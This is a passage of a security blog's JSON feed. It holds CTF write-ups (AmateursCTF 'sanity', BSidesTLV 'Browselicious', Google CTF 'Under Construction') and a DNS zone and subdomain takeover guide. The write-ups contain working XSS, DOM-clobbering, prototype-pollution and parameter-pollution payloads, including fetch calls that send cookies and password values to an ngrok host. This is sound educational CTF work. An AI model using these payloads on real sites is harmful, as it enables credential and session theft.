class='line'></div></code></div></pre><!-- HTML_TAG_END --><p>Run the code and proxy it through ngrok:</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\"><div class='code-container'><code><div class='line'>python3 server.py</div><div class='line'>ngrok http 8000</div></code></div></pre><!-- HTML_TAG_END --><h3 id=\"prototype-pollution\"><a href=\"#prototype-pollution\">Prototype Pollution</a></h3><p>With having control of the <code>extension</code> variable, lets try to do parameter pollution at this point. The most basic payload that came to my mind: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" javascript=\"true\"><div class=\"language-id\">javascript</div><div class='code-container'><code><div class='line'>&#123;</div><div class='line'>  \"__proto__\": &#123;</div><div class='line'>    \"sanitize\": false,</div><div class='line'>    \"report\": true</div><div class='line'>  &#125;</div><div class='line'>&#125;</div></code></div></pre><!-- HTML_TAG_END --><p>But as assumed very earlier, this gave me error as i can’t override the private member of Debug class. Well, the default value should be undefined when none provided for <code>get</code> function. Because, you see the simple sanitize resolves to the <code>get</code> function of the <code>Debug</code>. Since, we are overriding the prototype, we should leave it like this: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" javascript=\"true\"><div class=\"language-id\">javascript</div><div class='code-container'><code><div class='line'>&#123;</div><div class='line'>  \"__proto__\": &#123;</div><div class='line'>    \"report\": true</div><div class='line'>  &#125;</div><div class='line'>&#125;</div></code></div></pre><!-- HTML_TAG_END --><p><img src=\"https://github.com/hash3liZer/khatta/assets/29171692/8128f783-7c66-479d-8b10-39989c5346a2\" alt=\"image\" class=\"rounded-lg my-2\" loading=\"lazy\" decoding=\"async\"></p><p>And we got to this point as well. </p><h4 id=\"proof-of-concept-poc\"><a href=\"#proof-of-concept-poc\">Proof of Concept (POC)</a></h4><p>Lets craft our final PoC. In the <code>name your rant</code> field we have: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" html=\"true\"><div class=\"language-id\">html</div><div class='code-container'><code><div class='line'>&lt;a id=\"debug\"&gt;&lt;/a&gt;&lt;a id=\"debug\" name=\"extension\" href=\"http://payload.shameerkashif.me\"&gt;&lt;/a&gt;</div></code></div></pre><!-- HTML_TAG_END --><p>And for our server, we would give the following payload:</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" python=\"true\"><div class=\"language-id\">python</div><div class='code-container'><code><div class='line'>import http.server</div><div class='line'>import json</div><div class='line'></div><div class='line'>def handle_request(request):</div><div class='line'>    response = &#123;</div><div class='line'>      \"__proto__\": &#123;</div><div class='line'>        \"report\": true</div><div class='line'>      &#125;</div><div class='line'>    &#125;</div><div class='line'>    response_headers = &#123;\"Access-Control-Allow-Origin\": \"*\"&#125;</div><div class='line'>    return http.server.SimpleHTTPRequestHandler._set_headers(</div><div class='line'>        request, response, response_headers</div><div class='line'>    )</div><div class='line'></div><div class='line'>server = http.server.HTTPServer(('', 8000), handle_request)</div><div class='line'>server.serve_forever()</div></code></div></pre><!-- HTML_TAG_END --><p>And finally in the paste section, lets put our final payload to steal the cookie: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" html=\"true\"><div class=\"language-id\">html</div><div class='code-container'><code><div class='line'>&lt;script&gt;fetch(\"http://ngrokurl/\" + document.cookie)&lt;/script&gt;</div></code></div></pre><!-- HTML_TAG_END --><p>And we get the flag in the server url. As said i wasn’t able to solve the challenge within due time as i got stuck with anchor tag issue. But neverthless, this was a fun challenge and was worth exploring. </p>","summary":"A complete writeup of sanity web challenge from AmateursCTF 2023. It covers the use of the Sanitizer API in browsers, DOM Clobbering, Parameter Pollution and XSS.","image":"https://github.com/hash3liZer/khatta/assets/29171692/c70a5dc7-5294-45b7-8a9f-8a04ac9214b3","date_published":"2023-07-21T00:00:00.000Z","date_modified":"2023-10-29T16:18:54.402Z","tags":["amateurs-ctf","writeup","sanity","xss","dom-clobbering","prototype-pollution"],"_indieweb":{"type":"article"}},{"id":"blog/2023/subrake-a-dns-automated-scanner","url":"https://blog.shameerkashif.me/blog/2023/subrake-a-dns-automated-scanner","title":"A Guide to Zone Transfer, DNS Zone Takeover and Subdomain Takeover","content_html":"<h2 id=\"introduction\"><a href=\"#introduction\">Introduction</a></h2><p>DNS have been there for years now to help you find things normally you wouldn’t remember. In this guide, we will go through the following set of problems that a third party can find and take advantage of in negative terms:</p><ul><li>DNS Zone Transfer</li><li>Subdomain Takeover</li><li>DNS Zone Transfer</li></ul><h2 id=\"subrake\"><a href=\"#subrake\">Subrake</a></h2><p>The primary reason i wrote this blog post was this project i am working on: <a href=\"https://github.com/hash3liZer/Subrake\" rel=\"nofollow noopener noreferrer external\" target=\"_blank\">Subrake</a>. It’s an automated DNS scanner to cover various issues in a single go. Let me know what you think about it in the comment section…</p><h2 id=\"explanation\"><a href=\"#explanation\">Explanation</a></h2><h3 id=\"zone-transfer\"><a href=\"#zone-transfer\">Zone Transfer</a></h3><p>Zone Transfer itself is not a vulnerability and is a procedure followed to transfer the records of a domain from one DNS server to another. For example, you need to replicate the records of your domain available in <code>namecheap</code> to AWS <code>Route53</code>.</p><p>In a Zone transfer, the dns server sends a complete dns records file to another server. The file contains everything the DNS server has regarding that domain including its <code>A</code>, <code>AAAA</code>, <code>CNAME</code>, and <code>SOA</code> records. This includes the information which publicly isn’t accessible. </p><p>For example, you can’t access the <code>CNAME</code> records of any domain without having to brute force your way into it. But if the DNS server itself is offering the service, kaboom. </p><p>Most of the pople in industry are already aware of Zone transfer, so lets directly jump to the part <strong>How to find it?</strong>. There are many tools available in the wild to find <code>zone transfer</code>. But the famous and the most simple one is <code>dig</code>: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>dig zonetransfer.me -t AXFR +nocookie @dns_address</div></code></div></pre><!-- HTML_TAG_END --><ul><li>The <code>-t AXFR</code> option is a type of query to request zone transfer details.</li><li>The <code>+nocookie</code> option would disable the use of DNS cookies.</li><li>And additionally, you can specify <code>@dns_server</code> which can be skipped to use default DNS servers. I would highly recommend this option if you a playing a CTF or inside a network where a private DNS server is accessible.</li></ul><p>If successfull, this would list all the DNS records. This can also be accomplished using <code>subrake -d zonetransfer.me</code> and you would get: </p><img width=\"828\" alt=\"image\" src=\"https://github.com/hash3liZer/khatta/assets/29171692/e0552efd-45d1-41fc-ad00-63706be3849a\"><h3 id=\"subdomain-takeover\"><a href=\"#subdomain-takeover\">Subdomain Takeover</a></h3><p>Subdomain Takeover unlike it sounds is actually the takeover of the service that subdomain is pointing to. Lets say <code>marketing.domain.tld</code> was pointing to an Amazon <code>S3</code> bucket or <code>ELastic Beanstalk</code> service which actually didn’t exist. </p><p>A third party can come and claim this service. Now what happens is that the party that claimed the service can host whatever they want on that subdomain but that ofcourse is limited to what the service has to offer. </p><p>Most of the people in industry have been creating their automations of this. Some use their own tools and some have sort of created a workflow. </p><p>You can go for a <code>oneliner</code>: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" python=\"true\"><div class=\"language-id\">python</div><div class='code-container'><code><div class='line'>subfinder -d HOST &gt;&gt; FILE; assetfinder --subs-only HOST &gt;&gt; FILE; amass enum -norecursive -noalts -d HOST &gt;&gt; FILE; subjack -w FILE -t 100 -timeout 30 -ssl -c $GOPATH/src/github.com/haccer/subjack/fingerprints.json -v 3 &gt;&gt; takeover ; </div></code></div></pre><!-- HTML_TAG_END --><p>Or you can find the subdomains first using different tools and public sources and probably use a tool to check the takeover. </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" python=\"true\"><div class=\"language-id\">python</div><div class='code-container'><code><div class='line'>python3 sublist3r.py -d target.com</div><div class='line'>amass enum -d target.com</div><div class='line'>...</div></code></div></pre><!-- HTML_TAG_END --><p>Checking the takeover: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" python=\"true\"><div class=\"language-id\">python</div><div class='code-container'><code><div class='line'>subrake -d target.com -w ./finalwordlists.txt</div></code></div></pre><!-- HTML_TAG_END --><img width=\"828\" alt=\"image\" src=\"https://github.com/hash3liZer/khatta/assets/29171692/ce1559b0-e5fe-4fdc-ae2c-98de252c9970\"><p>The list of services that are currently known to vulnerable to Subdomain Takeover can be found at: <strong><a href=\"https://github.com/EdOverflow/can-i-take-over-xyz\" rel=\"nofollow noopener noreferrer external\" target=\"_blank\">Can I Takeover XYZ</a></strong></p><h3 id=\"dns-zone-takeover\"><a href=\"#dns-zone-takeover\">DNS Zone Takeover</a></h3><p>Zone Takeover is a term not too old right now and its actually is as it sounds unlike subdomain takeover. And it can be more <strong>severe</strong> as you have the control over the complete zone. In order words, you can host your own <code>records</code> and are not limited to the service being used like subdomain takeover. </p><p>The normal procedure that is being followed or atleast i follow this:</p><ul><li>I purchase the domain from namecheap or godaddy.</li><li>I create a new <code>Hosted Zone</code> in AWS <code>Route53</code> service.</li><li>The hosted zone gives me a set of nameservers.</li><li>I enter these nameservers into the Authoritative nameservers section in GoDaddy or namecheap.</li><li>Then i use the <code>Route53</code> service instead of GoDaddy or Namecheap to manage the records like <code>A</code>, <code>AAAA</code>, or <code>CNAME</code>. </li></ul><p>Infact, if you ever worked with <strong>Cloudflare</strong>, you would know that you create a new website in Cloudflare. In result you get the nameservers. You then set the <code>nameservers</code> with the domain you purchased. </p><p>After doing so, you <em>add/edit/remove</em> the records within the cloudflare panel. Lets suppose, after a year you plan to not use the Cloudflare service anymore. So, you delete your website from cloudflare but doesn’t actually remove the authoritative entries in your domain settings from godaddy. </p><p>Since the nameserver entries already exist and still pointing to the service (aka cloudflare in this case), a third party can claim the service which would lead to <strong>zone takeover</strong>. </p><p>If you understand the above scenario, you can relate it to the subdomain takeover where you claim the stale service. But here, its the stale zone. </p><h4 id=\"finding-zone-takeover\"><a href=\"#finding-zone-takeover\">Finding Zone Takeover</a></h4><p>The good thing with zone takeover is you don’t have to brute force your way into it or find anything publicly. The information is already there, you just have to make sure its in the right condition. </p><p>The first step would be to get the nameservers of the domain. We can use <code>dig</code> for that: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>dig shameerkashif.me +trace +all</div></code></div></pre><!-- HTML_TAG_END --><p>Or you can directly get the <code>NS</code> records and start looking from there. </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\"><div class='code-container'><code><div class='line'>dig shameerkashif.me NS</div></code></div></pre><!-- HTML_TAG_END --><img width=\"894\" alt=\"image\" src=\"https://github.com/hash3liZer/khatta/assets/29171692/aba8e709-0b33-486a-ac5c-c0ab48264625\"><p>The against each NS record, check if any of them fails to responsd. If it does, it can probably be vulnerable to zone takeover. The case it failes, you will have the status as <strong>REFUSED</strong> or <strong>SERVFAIL</strong>: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\"><div class='code-container'><code><div class='line'>dig shameerkashif.me @ns1.digitalocean.com</div></code></div></pre><!-- HTML_TAG_END --><p>You can also check for <code>SOA</code> which is what i would like to do instead (to be more concise): </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\"><div class='code-container'><code><div class='line'>dig shameerkashif.me @ns1.digitalocean.com SOA</div></code></div></pre><!-- HTML_TAG_END --><p>Well, if it doesn’t responsd, you can try to claim the service. As of now, the current vulnerable services are available at: <a href=\"https://github.com/indianajson/can-i-take-over-dns\" rel=\"nofollow noopener noreferrer external\" target=\"_blank\">Can I Takeover DNS</a></p><p>Well, with subrake, it first tries to resolve each nameserver and if it does then it tries to guess the service and tells if its vulnerable or not. Something like this: </p><img width=\"743\" alt=\"image\" src=\"https://github.com/hash3liZer/khatta/assets/29171692/3d55e662-c019-4062-8c46-4c9075c47a8e\"><h2 id=\"using-subrake\"><a href=\"#using-subrake\">Using Subrake</a></h2><p>Subrake can help you pick all 3 above cases. The complete information and details can be found at the link i mentioned in the start of this blog. I am simply attaching a screenshot with the details. </p><img src=\"https://user-images.githubusercontent.com/29171692/250178751-75abd71e-7765-4da0-8b08-1cc5e1e069c7.png\"><h2 id=\"conclusion\"><a href=\"#conclusion\">Conclusion</a></h2><p>First of all, i hope this guide was helpful 😅. We saw 3 different cases namely, Zone Transfer, Zone Takeover and Subdomain Takeover. The mitigation simply is to be aware of when you remove a service. Make sure the entries in your DNS gets updated as well. Or wrap the service completely.</p>","summary":"In this guide, we will be looking over vulnerabilites associated with a domain normally occured due to the negligence from the develper team. The terms we will see are Zone Transfer, DNS Zone Takeover and Subdomain Takeover.","image":"https://github.com/hash3liZer/khatta/assets/29171692/755e47ec-8f67-45e9-a7cb-04efe7584127","date_published":"2023-06-30T00:00:00.000Z","date_modified":"2023-10-29T16:18:54.402Z","tags":["dns-zone-takeover","dns-zone-transfer","subdomain-takeover","bugbounty","infosec","reconnaissance","automated-tool"],"_indieweb":{"type":"article"}},{"id":"blog/2023/writeup-browselicious-challenge-bsidestlv-ctf","url":"https://blog.shameerkashif.me/blog/2023/writeup-browselicious-challenge-bsidestlv-ctf","title":"BSidesTLV CTF 2023 Browselicious (Misc) Writeup","content_html":"<h1 id=\"introducton\"><a href=\"#introducton\">Introducton</a></h1><p>This writeup is for the <strong>Browselicious</strong> challenge from <strong>Misc</strong> category in BSidesTLV CTF held online. The challenge had an external link and a <code>js</code> file that contained browser extension code. The external link was a simple website that had a URL Input field. The URL was probably being processed in a browser on the backend with the extension installed.</p><p>To complete the challenge, one had to create a document with a <code>input[type=&quot;password&quot;]</code> field and capture the value of this field when populated by the extension itself. But also, we needed to exploit a race condition here by doing a <code>postMessage</code> before the extension itself.</p><h1 id=\"writeup\"><a href=\"#writeup\">Writeup</a></h1><h3 id=\"server-request\"><a href=\"#server-request\">Server Request</a></h3><p>Right after i visited the page, it said <em>Our Extension is coming soon</em> and there was an input field that accepted a URL. So, right away i fired up <code>ngrok</code> without actually running anything for the proxy and checked if i received anything back.</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>$ ngrok http 8000</div></code></div></pre><!-- HTML_TAG_END --><p>And i got requests back on terminal.</p><img width=\"946\" alt=\"image\" src=\"https://github.com/hash3liZer/khatta/assets/29171692/ba40787f-c811-46ec-93a5-1a67298d9a28\"><h3 id=\"code-review\"><a href=\"#code-review\">Code Review</a></h3><p>Then i opened the <code>js</code> file and the code has 2 main events: <code>onMessage</code> and <code>onLoad</code>. The first event checks for a couple conditions and populates data in the <code>input[type=&quot;password&quot;]</code> field. The second event simply fires a <code>postMessage</code> to the current window with some data. </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" javascript=\"true\"><div class=\"language-id\">javascript</div><div class='code-container'><code><div class='line'>// Listen for messages from the extension</div><div class='line'>window.addEventListener(\"message\", function (event) &#123;</div><div class='line'>    // Check if the message is from the extension</div><div class='line'>    if (event.source === window && event.data.action === \"populatePassword\") &#123;</div><div class='line'>        // Find the password input field</div><div class='line'>        var passwordField = document.querySelector('input[type=\"password\"]');</div><div class='line'></div><div class='line'>        // Populate the password field with the specified string</div><div class='line'>        if (passwordField) &#123;</div><div class='line'>            passwordField.value = (event.data.url === \"http://flag\") ? \"BSidevTLV2023&#123;TheFlag&#125;\" : \"MyDefaultPassword\";</div><div class='line'>        &#125;</div><div class='line'>    &#125;</div><div class='line'>&#125;);</div><div class='line'></div><div class='line'>// Send a message to populate the password field on page load</div><div class='line'>window.addEventListener(\"load\", function () &#123;</div><div class='line'>    window.postMessage(&#123;</div><div class='line'>        action: \"populatePassword\",</div><div class='line'>        url: window.location.href,</div><div class='line'>        password: \"YourPassword\" // Replace with the desired password</div><div class='line'>    &#125;, \"*\");</div><div class='line'>&#125;);</div></code></div></pre><!-- HTML_TAG_END --><h3 id=\"exploit\"><a href=\"#exploit\">Exploit</a></h3><p>To exploit the challenge, we need to implement 3 things in the PoC:</p><ul><li>Create a web page with <code>input[type=&quot;password&quot;]</code> form field which will accept the data.</li><li>Exploit the Race condition by setting an interval in <em>milliseconds</em>.</li><li>In the <code>postMessage</code>, set the value of <code>url</code> to <code>http://flag</code>.</li></ul><p>Before we head to the exploit work, setup a <code>python</code> file to act as our server: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" python=\"true\"><div class=\"language-id\">python</div><div class='code-container'><code><div class='line'>import http.server</div><div class='line'>import socketserver</div><div class='line'></div><div class='line'>PORT = 8000</div><div class='line'></div><div class='line'>html_content = r'''</div><div class='line'>PAYLOAD HERE</div><div class='line'>'''</div><div class='line'></div><div class='line'># Request Handler</div><div class='line'>class MyHandler(http.server.BaseHTTPRequestHandler):</div><div class='line'>    def do_GET(self):</div><div class='line'>        self.send_response(200)</div><div class='line'>        self.send_header('Content-type', 'text/html')</div><div class='line'>        self.end_headers()</div><div class='line'>        self.wfile.write(html_content.encode('utf-8'))</div><div class='line'></div><div class='line'>with socketserver.TCPServer((\"0.0.0.0\", PORT), MyHandler) as httpd:</div><div class='line'>    print(f\"Serving at port &#123;PORT&#125;\")</div><div class='line'>    httpd.serve_forever()</div></code></div></pre><!-- HTML_TAG_END --><h4 id=\"input-field\"><a href=\"#input-field\">Input Field</a></h4><p>Put together an html code that as input field: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" html=\"true\"><div class=\"language-id\">html</div><div class='code-container'><code><div class='line'>&lt;!DOCTYPE html&gt;</div><div class='line'>&lt;html lang=\"en\"&gt;</div><div class='line'>&lt;head&gt;</div><div class='line'>    &lt;meta charset=\"utf-8\" /&gt;</div><div class='line'>    &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" /&gt;</div><div class='line'>    &lt;title&gt;POC Vulnerable website&lt;/title&gt;</div><div class='line'>&lt;/head&gt;</div><div class='line'>&lt;body&gt;</div><div class='line'>    &lt;form&gt;</div><div class='line'>        &lt;input type=\"password\"&gt;&lt;/input&gt;</div><div class='line'>        &lt;script&gt;</div><div class='line'>          window.addEventListener('load', () =&gt; &#123;</div><div class='line'>                let elem = document.querySelector(\"input\");</div><div class='line'>                if(elem.value)&#123;</div><div class='line'>                    fetch(\"https://f5d4-101-50-76-194.ngrok-free.app/?value=\" + (elem.value || \"nothing\"));</div><div class='line'>                &#125;</div><div class='line'>            &#125;);</div><div class='line'>        &lt;/script&gt;</div><div class='line'>    &lt;/form&gt;</div><div class='line'>&lt;/body&gt;</div><div class='line'>&lt;/html&gt;</div></code></div></pre><!-- HTML_TAG_END --><p>I fired up this python server, proxied through ngrok:</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>$ python3 poc.py</div></code></div></pre><!-- HTML_TAG_END --><p>Got, the following result:</p><img width=\"946\" alt=\"image\" src=\"https://github.com/hash3liZer/khatta/assets/29171692/d267f5fa-f46e-4443-b43e-64f354a443dc\"><h4 id=\"race-condition\"><a href=\"#race-condition\">Race Condition</a></h4><p>To exploit the race condition, i simply replaced the <code>addEventListener</code> with <code>setInterval</code> having <code>20ms</code>. </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" javascript=\"true\"><div class=\"language-id\">javascript</div><div class='code-container'><code><div class='line'>setInterval(() =&gt; &#123;</div><div class='line'>  let elem = document.querySelector(\"input\");</div><div class='line'>  if(elem.value)&#123;</div><div class='line'>      fetch(\"https://f5d4-101-50-76-194.ngrok-free.app/?value=\" + (elem.value || \"nothing\"));</div><div class='line'>  &#125;</div><div class='line'>&#125;, 20);</div></code></div></pre><!-- HTML_TAG_END --><h4 id=\"post-message\"><a href=\"#post-message\">Post Message</a></h4><p>Now, simply put the <code>postMessage</code> inside the callback function: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" javascript=\"true\"><div class=\"language-id\">javascript</div><div class='code-container'><code><div class='line'>setInterval(() =&gt; &#123;</div><div class='line'>  window.postMessage(&#123;</div><div class='line'>      action: \"populatePassword\",</div><div class='line'>      url: \"http://flag\",</div><div class='line'>      password: \"YourPassword\" // Replace with the desired password</div><div class='line'>  &#125;, \"*\");</div><div class='line'></div><div class='line'>  let elem = document.querySelector(\"input\");</div><div class='line'>  if(elem.value)&#123;</div><div class='line'>      fetch(\"https://f5d4-101-50-76-194.ngrok-free.app/?value=\" + (elem.value || \"nothing\"));</div><div class='line'>  &#125;</div><div class='line'>&#125;, 20);</div></code></div></pre><!-- HTML_TAG_END --><p>This time i fired up the server and got the flag:</p><img width=\"946\" alt=\"image\" src=\"https://github.com/hash3liZer/khatta/assets/29171692/aaa3fa1b-1c7b-45d4-9745-4464d6dd1f4f\"><h2 id=\"poc\"><a href=\"#poc\">PoC</a></h2><p>The complete Proof of Concept:</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" python=\"true\"><div class=\"language-id\">python</div><div class='code-container'><code><div class='line'>import http.server</div><div class='line'>import socketserver</div><div class='line'></div><div class='line'>PORT = 8000</div><div class='line'></div><div class='line'>html_content = r\"\"\"</div><div class='line'>&lt;!DOCTYPE html&gt;</div><div class='line'>&lt;html lang=\"en\"&gt;</div><div class='line'>&lt;head&gt;</div><div class='line'>    &lt;meta charset=\"utf-8\" /&gt;</div><div class='line'>    &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" /&gt;</div><div class='line'>    &lt;title&gt;POC Vulnerable website&lt;/title&gt;</div><div class='line'>&lt;/head&gt;</div><div class='line'>&lt;body&gt;</div><div class='line'>    &lt;form&gt;</div><div class='line'>        &lt;input type=\"password\"&gt;&lt;/input&gt;</div><div class='line'>    &lt;/form&gt;</div><div class='line'>    &lt;script&gt;</div><div class='line'>            setInterval(() =&gt; &#123;</div><div class='line'>                window.postMessage(&#123;</div><div class='line'>                    action: \"populatePassword\",</div><div class='line'>                    url: \"http://flag\",</div><div class='line'>                    password: \"YourPassword\" // Replace with the desired password</div><div class='line'>                &#125;, \"*\");</div><div class='line'></div><div class='line'>                let elem = document.querySelector(\"input\");</div><div class='line'>                if(elem.value)&#123;</div><div class='line'>                    fetch(\"https://f5d4-101-50-76-194.ngrok-free.app/?value=\" + (elem.value || \"nothing\"));</div><div class='line'>                &#125;</div><div class='line'>            &#125;, 20);</div><div class='line'>    &lt;/script&gt;</div><div class='line'>&lt;/body&gt;</div><div class='line'>&lt;/html&gt;</div><div class='line'>\"\"\"</div><div class='line'></div><div class='line'>class MyHandler(http.server.BaseHTTPRequestHandler):</div><div class='line'>    def do_GET(self):</div><div class='line'>        self.send_response(200)</div><div class='line'>        self.send_header('Content-type', 'text/html')</div><div class='line'>        self.end_headers()</div><div class='line'>        self.wfile.write(html_content.encode('utf-8'))</div><div class='line'></div><div class='line'>with socketserver.TCPServer((\"0.0.0.0\", PORT), MyHandler) as httpd:</div><div class='line'>    print(f\"Serving at port &#123;PORT&#125;\")</div><div class='line'>    httpd.serve_forever()</div></code></div></pre><!-- HTML_TAG_END -->","summary":"Writeup for Browselicious challenge (Misc) from BsidesTLV CTF 2023","image":"https://github.com/hash3liZer/khatta/assets/29171692/1788ec87-fc59-49a7-a035-ec767504fb3d","date_published":"2023-06-28T00:00:00.000Z","date_modified":"2023-10-29T16:18:54.402Z","tags":["ctf","writeups","bsidestlv-ctf-2023"],"_indieweb":{"type":"article"}},{"id":"blog/2023/writeup-under-construction-google-ctf-2023","url":"https://blog.shameerkashif.me/blog/2023/writeup-under-construction-google-ctf-2023","title":"Google CTF 2023 Under Construction (Web) Writeup","content_html":"<h1 id=\"introduction\"><a href=\"#introduction\">Introduction</a></h1><p>This writeup is for the under construction challenge from web category in Google CTF 2023. The challenge was provided with the following statement: <em>“We were building a web app but the new CEO wants it remade in php.”</em></p><p>The challenge contained 2 different web apps. One was in PHP that seems to be under development whilst flask app seemed like a full application. This writeup covers an <code>Parameter Pollution</code> vulnerability we were able to create an escalated user by supplying more than 1 parameter. </p><h1 id=\"writeup\"><a href=\"#writeup\">Writeup</a></h1><h2 id=\"getting-started\"><a href=\"#getting-started\">Getting Started</a></h2><p>So, at first i visited the URLS and got to know the application surface. Then i downloaded the challenge files available and opened them in the editor. </p><p>Reading the code, i got to the <code>flag</code> point. In the <code>index.php</code> file, we have: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" php=\"true\"><div class=\"language-id\">php</div><div class='code-container'><code><div class='line'>...</div><div class='line'>if ($tier === NULL) &#123;</div><div class='line'>    return \"Invalid credentials\";</div><div class='line'>&#125;</div><div class='line'></div><div class='line'>$response = \"Login successful. Welcome \" . htmlspecialchars($username) . \".\";</div><div class='line'></div><div class='line'>// Look at this part. </div><div class='line'>if ($tier === \"gold\") &#123;</div><div class='line'>    $response .= \" \" . getenv(\"FLAG\");</div><div class='line'>&#125;</div><div class='line'></div><div class='line'>return $response;</div><div class='line'></div><div class='line'>...</div></code></div></pre><!-- HTML_TAG_END --><p>So, in order to get the flag, we need to create a gold tier user first. The PHP application itself doesn’t offer any signup functionlaity but the <code>account_migrator.php</code> file does that is being called from the flask application. So, if we look at the flask application, we will find where the user is being registered. </p><h2 id=\"vulnerable-part\"><a href=\"#vulnerable-part\">Vulnerable Part</a></h2><p>In the <code>authorized_routes.py</code>, we have: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" python=\"true\"><div class=\"language-id\">python</div><div class='code-container'><code><div class='line'>...</div><div class='line'>@authorized.route('/signup', methods=['POST'])</div><div class='line'>def signup_post():</div><div class='line'>  ...</div><div class='line'>  tier = models.Tier(request.form.get('tier'))</div><div class='line'></div><div class='line'>  if(tier == models.Tier.GOLD):</div><div class='line'>      flash('GOLD tier only allowed for the CEO')</div><div class='line'>      return redirect(url_for('authorized.signup'))  # Validation is based on first parameter</div><div class='line'>  ...</div><div class='line'></div><div class='line'>  new_user = models.User(username=username, </div><div class='line'>  password=generate_password_hash(password, method='sha256'), tier=tier.name)</div><div class='line'>  </div><div class='line'>  db.session.add(new_user)</div><div class='line'>  db.session.commit()</div><div class='line'>  </div><div class='line'>  requests.post(f\"http://&#123;PHP_HOST&#125;:1337/account_migrator.php\", </div><div class='line'>      headers=&#123;\"token\": TOKEN, \"content-type\": request.headers.get(\"content-type\")&#125;, data=raw_request) # Vulnerable PART</div><div class='line'>  return redirect(url_for('authorized.login'))</div></code></div></pre><!-- HTML_TAG_END --><p>The validation is based on the statement: <code>request.form.get(&#39;tier&#39;)</code>. This will always pick the first parameter if multiple parameters are to be supplied. However, the application is passing the <code>raw_request</code> as it is to the next application which is in PHP. </p><p>Take the following example:</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'># Flask</div><div class='line'>curl https://vulnerablepart.com?tier=gold&tier=blue</div><div class='line'># you will the first parameter aka gold.</div><div class='line'></div><div class='line'># PHP</div><div class='line'>curl http://vulnerablepart.com?tier=gold&tier=bold</div><div class='line'># you will get the second parameter aka bold</div></code></div></pre><!-- HTML_TAG_END --><h2 id=\"exploit\"><a href=\"#exploit\">Exploit</a></h2><p>In order to exploit this, we needed to create the user normally but with extra argument containing <code>gold</code> value. I simply signed up with the following request in Burp: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" javascript=\"true\"><div class=\"language-id\">javascript</div><div class='code-container'><code><div class='line'>POST /signup HTTP/2</div><div class='line'>Host: under-construction-web.2023.ctfcompetition.com</div><div class='line'>Upgrade-Insecure-Requests: 1</div><div class='line'>Origin: https://under-construction-web.2023.ctfcompetition.com</div><div class='line'>Content-Type: application/x-www-form-urlencoded</div><div class='line'>User-Agent: &lt;Redacted&gt;</div><div class='line'>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</div><div class='line'></div><div class='line'>username=hash3liZer&password=password&tier=blue&tier=gold</div></code></div></pre><!-- HTML_TAG_END --><p>And it took me back to login page to signin:</p><img width=\"962\" alt=\"image\" src=\"https://github.com/hash3liZer/khatta.sh/assets/29171692/e898c72f-b040-49d5-8f1b-4d07b40c24b3\"><p>So, i went to the PHP application and logged in and got the flag:</p><img width=\"1440\" alt=\"image\" src=\"https://github.com/hash3liZer/khatta.sh/assets/29171692/c6f61468-a875-4656-bd77-7c63190ee67f\"><!-- HTML_TAG_START --><pre class=\"shiki material-default\"><div class='code-container'><code><div class='line'>CTF&#123;ff79e2741f21abd77dc48f17bab64c3d&#125;</div></code></div></pre><!-- HTML_TAG_END -->","summary":"Writeup for under construction challenge from google ctf 2023","image":"https://github.com/hash3liZer/khatta.sh/assets/29171692/f553635d-6deb-43e5-a2ae-0d8cef296db7","date_published":"2023-06-27T00:00:00.000Z","date_modified":"2023-10-29T16:18:54.402Z","tags":["ctf","writeups","google-ctf-2023"],"_indieweb":{"type":"article"}}]}